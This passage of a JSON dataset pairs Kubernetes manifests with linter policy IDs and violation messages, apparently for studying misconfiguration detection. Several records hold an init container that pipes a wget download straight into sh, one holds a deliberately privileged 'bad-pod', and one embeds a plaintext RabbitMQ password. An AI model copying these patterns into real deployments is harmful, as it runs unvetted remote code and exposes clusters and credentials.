    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/micro_frontend:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: 127.0.0.1:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: 127.0.0.1:7000\n        - name: CART_SERVICE_ADDR\n          value: 127.0.0.1:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: 127.0.0.1:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: 127.0.0.1:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: 127.0.0.1:5050\n        - name: AD_SERVICE_ADDR\n          value: 127.0.0.1:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "8830",
    "manifest_path": "data/manifests/the_stack_sample/sample_3332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/micro_frontend:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: 127.0.0.1:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: 127.0.0.1:7000\n        - name: CART_SERVICE_ADDR\n          value: 127.0.0.1:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: 127.0.0.1:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: 127.0.0.1:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: 127.0.0.1:5050\n        - name: AD_SERVICE_ADDR\n          value: 127.0.0.1:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "8831",
    "manifest_path": "data/manifests/the_stack_sample/sample_3332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/micro_frontend:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: 127.0.0.1:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: 127.0.0.1:7000\n        - name: CART_SERVICE_ADDR\n          value: 127.0.0.1:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: 127.0.0.1:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: 127.0.0.1:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: 127.0.0.1:5050\n        - name: AD_SERVICE_ADDR\n          value: 127.0.0.1:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "8832",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-webservice\" does not have a read-only root file system"
  },
  {
    "id": "8833",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "8834",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-webservice\" is not set to runAsNonRoot"
  },
  {
    "id": "8835",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "8836",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-webservice\" has cpu request 0"
  },
  {
    "id": "8837",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "8838",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-webservice\" has memory limit 0"
  },
  {
    "id": "8839",
    "manifest_path": "data/manifests/the_stack_sample/sample_3333.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    key: Otus_1\nspec:\n  containers:\n  - name: web\n    image: yerlanagzhigitov/otus-homework1:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-webservice\n    image: busybox:1.31.0\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "8840",
    "manifest_path": "data/manifests/the_stack_sample/sample_3335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mock-case\n  labels:\n    app: mock-case\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock-case\n  template:\n    metadata:\n      name: mock-case\n      labels:\n        app: mock-case\n    spec:\n      containers:\n      - name: mock-case\n        image: eu.gcr.io/sdc-int-ci/mock-case:0.35.0-rc.1\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: '0.1'\n            memory: 512Mi\n          limits:\n            cpu: 0.5M\n            memory: 1024Mi\n        readinessProbe:\n          httpGet:\n            path: /info\n            port: 8161\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            path: /info\n            port: 8161\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          failureThreshold: 3\n          successThreshold: 1\n        ports:\n        - name: http-server\n          containerPort: 8161\n        env:\n        - name: JAVA_TOOL_OPTIONS\n          value: -Dspring.profiles.active=dev -Dlogging.level.uk.gov.ons.ctp=DEBUG\n            -Dlogging.level.org.springframework=WARN -Dendpoints.autoconfig.enabled=false\n            -Dendpoints.beans.enabled=false -Dendpoints.configprops.enabled=false\n            -Dendpoints.dump.enabled=false -Dendpoints.env.enabled=false -Dendpoints.metrics.enabled=false\n            -Dendpoints.mapping.enabled=false -Dendpoints.shutdown.enabled=false -Dendpoints.trace.enabled=false\n            -Dmanagement.health.rabbit.enabled=false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mock-case\" does not have a read-only root file system"
  },
  {
    "id": "8841",
    "manifest_path": "data/manifests/the_stack_sample/sample_3335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mock-case\n  labels:\n    app: mock-case\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mock-case\n  template:\n    metadata:\n      name: mock-case\n      labels:\n        app: mock-case\n    spec:\n      containers:\n      - name: mock-case\n        image: eu.gcr.io/sdc-int-ci/mock-case:0.35.0-rc.1\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: '0.1'\n            memory: 512Mi\n          limits:\n            cpu: 0.5M\n            memory: 1024Mi\n        readinessProbe:\n          httpGet:\n            path: /info\n            port: 8161\n          initialDelaySeconds: 20\n          periodSeconds: 10\n          failureThreshold: 3\n          successThreshold: 1\n        livenessProbe:\n          httpGet:\n            path: /info\n            port: 8161\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          failureThreshold: 3\n          successThreshold: 1\n        ports:\n        - name: http-server\n          containerPort: 8161\n        env:\n        - name: JAVA_TOOL_OPTIONS\n          value: -Dspring.profiles.active=dev -Dlogging.level.uk.gov.ons.ctp=DEBUG\n            -Dlogging.level.org.springframework=WARN -Dendpoints.autoconfig.enabled=false\n            -Dendpoints.beans.enabled=false -Dendpoints.configprops.enabled=false\n            -Dendpoints.dump.enabled=false -Dendpoints.env.enabled=false -Dendpoints.metrics.enabled=false\n            -Dendpoints.mapping.enabled=false -Dendpoints.shutdown.enabled=false -Dendpoints.trace.enabled=false\n            -Dmanagement.health.rabbit.enabled=false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mock-case\" is not set to runAsNonRoot"
  },
  {
    "id": "8842",
    "manifest_path": "data/manifests/the_stack_sample/sample_3337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200924-4bb1aa1ffa\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "8843",
    "manifest_path": "data/manifests/the_stack_sample/sample_3337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200924-4bb1aa1ffa\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "8844",
    "manifest_path": "data/manifests/the_stack_sample/sample_3337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200924-4bb1aa1ffa\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "8845",
    "manifest_path": "data/manifests/the_stack_sample/sample_3337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200924-4bb1aa1ffa\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "8846",
    "manifest_path": "data/manifests/the_stack_sample/sample_3337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200924-4bb1aa1ffa\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "8847",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webapp-ctr\" does not have a read-only root file system"
  },
  {
    "id": "8848",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"webapp-ctr\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8849",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"webapp-ctr\" is privileged"
  },
  {
    "id": "8850",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"webapp-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "8851",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"webapp-ctr\" has cpu request 0"
  },
  {
    "id": "8852",
    "manifest_path": "data/manifests/the_stack_sample/sample_3338.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\n  labels:\n    app: bad-pod\nspec:\n  containers:\n  - name: webapp-ctr\n    image: k8smaestro/web-app:1.0\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"webapp-ctr\" has memory limit 0"
  },
  {
    "id": "8853",
    "manifest_path": "data/manifests/the_stack_sample/sample_3339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: did-finder-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: did-finder-demo\n  template:\n    metadata:\n      labels:\n        app: did-finder-demo\n    spec:\n      containers:\n      - name: did-finder-demo\n        image: servicex-did-finder-demo:latest\n        imagePullPolicy: Never\n        env:\n        - name: INSTANCE_NAME\n          value: pondd-servicex\n        args:\n        - --rabbit-uri\n        - amqp://user:leftfoot1@pondd-servicex-rabbitmq:5672\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"did-finder-demo\" is using an invalid container image, \"servicex-did-finder-demo:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8854",
    "manifest_path": "data/manifests/the_stack_sample/sample_3339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: did-finder-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: did-finder-demo\n  template:\n    metadata:\n      labels:\n        app: did-finder-demo\n    spec:\n      containers:\n      - name: did-finder-demo\n        image: servicex-did-finder-demo:latest\n        imagePullPolicy: Never\n        env:\n        - name: INSTANCE_NAME\n          value: pondd-servicex\n        args:\n        - --rabbit-uri\n        - amqp://user:leftfoot1@pondd-servicex-rabbitmq:5672\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"did-finder-demo\" does not have a read-only root file system"
  },
  {
    "id": "8855",
    "manifest_path": "data/manifests/the_stack_sample/sample_3339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: did-finder-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: did-finder-demo\n  template:\n    metadata:\n      labels:\n        app: did-finder-demo\n    spec:\n      containers:\n      - name: did-finder-demo\n        image: servicex-did-finder-demo:latest\n        imagePullPolicy: Never\n        env:\n        - name: INSTANCE_NAME\n          value: pondd-servicex\n        args:\n        - --rabbit-uri\n        - amqp://user:leftfoot1@pondd-servicex-rabbitmq:5672\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"did-finder-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "8856",
    "manifest_path": "data/manifests/the_stack_sample/sample_3339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: did-finder-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: did-finder-demo\n  template:\n    metadata:\n      labels:\n        app: did-finder-demo\n    spec:\n      containers:\n      - name: did-finder-demo\n        image: servicex-did-finder-demo:latest\n        imagePullPolicy: Never\n        env:\n        - name: INSTANCE_NAME\n          value: pondd-servicex\n        args:\n        - --rabbit-uri\n        - amqp://user:leftfoot1@pondd-servicex-rabbitmq:5672\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"did-finder-demo\" has cpu request 0"
  },
  {
    "id": "8857",
    "manifest_path": "data/manifests/the_stack_sample/sample_3339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: did-finder-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: did-finder-demo\n  template:\n    metadata:\n      labels:\n        app: did-finder-demo\n    spec:\n      containers:\n      - name: did-finder-demo\n        image: servicex-did-finder-demo:latest\n        imagePullPolicy: Never\n        env:\n        - name: INSTANCE_NAME\n          value: pondd-servicex\n        args:\n        - --rabbit-uri\n        - amqp://user:leftfoot1@pondd-servicex-rabbitmq:5672\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"did-finder-demo\" has memory limit 0"
  },
  {
    "id": "8858",
    "manifest_path": "data/manifests/the_stack_sample/sample_3341.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-test-deploy\n  labels:\n    name: hello-test\n  annotations:\n    litmuschaos.io/chaos: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hello-test\n  template:\n    metadata:\n      labels:\n        name: hello-test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8859",
    "manifest_path": "data/manifests/the_stack_sample/sample_3341.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-test-deploy\n  labels:\n    name: hello-test\n  annotations:\n    litmuschaos.io/chaos: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hello-test\n  template:\n    metadata:\n      labels:\n        name: hello-test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8860",
    "manifest_path": "data/manifests/the_stack_sample/sample_3341.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-test-deploy\n  labels:\n    name: hello-test\n  annotations:\n    litmuschaos.io/chaos: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hello-test\n  template:\n    metadata:\n      labels:\n        name: hello-test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8861",
    "manifest_path": "data/manifests/the_stack_sample/sample_3341.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-test-deploy\n  labels:\n    name: hello-test\n  annotations:\n    litmuschaos.io/chaos: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hello-test\n  template:\n    metadata:\n      labels:\n        name: hello-test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8862",
    "manifest_path": "data/manifests/the_stack_sample/sample_3343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5249\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8863",
    "manifest_path": "data/manifests/the_stack_sample/sample_3343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5249\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8864",
    "manifest_path": "data/manifests/the_stack_sample/sample_3343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5249\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8865",
    "manifest_path": "data/manifests/the_stack_sample/sample_3343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5249\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8866",
    "manifest_path": "data/manifests/the_stack_sample/sample_3343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5249\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8867",
    "manifest_path": "data/manifests/the_stack_sample/sample_3344.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sample-hostaliases\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:1.12\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "8868",
    "manifest_path": "data/manifests/the_stack_sample/sample_3344.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sample-hostaliases\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:1.12\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8869",
    "manifest_path": "data/manifests/the_stack_sample/sample_3344.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sample-hostaliases\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:1.12\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "8870",
    "manifest_path": "data/manifests/the_stack_sample/sample_3344.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sample-hostaliases\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx:1.12\n",
